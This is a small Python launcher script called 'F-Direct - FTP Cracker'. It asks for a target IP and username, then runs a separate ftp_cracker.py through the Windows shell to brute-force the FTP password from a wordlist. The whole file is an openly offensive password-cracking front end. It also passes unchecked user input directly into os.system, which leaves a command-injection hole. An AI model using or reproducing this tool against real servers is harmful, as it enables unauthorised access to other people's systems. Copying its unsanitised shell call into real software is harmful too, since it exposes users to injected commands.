from colorama import init
init() #For adding color, text stlying, etc. Do deinit() to stop.


from colorama import Fore, Style #add color. Use Fore(test), Back(background) and/or Style.
print(Fore.RED + "\n F-Direct - FTP Cracker")

print(Fore.GREEN)
target_ip = input("\n Enter IP: ")
target_username = input("\n Enter User: ")
#thread_count = input("Thread Count(Default is 30): ")
print("\nTarget IP: " + target_ip)
print("\nTarget Username: " + target_username)
#print("\nAttacking with " + thread_count + " threads")
attack = 'python ftp_cracker.py ' + target_ip + ' -u ' + target_username + " -p wordlist.txt" # once fixed, Add after .txt --threads " + thread_count
print(attack)
    
import os
os.system('cmd /k ' + attack) 
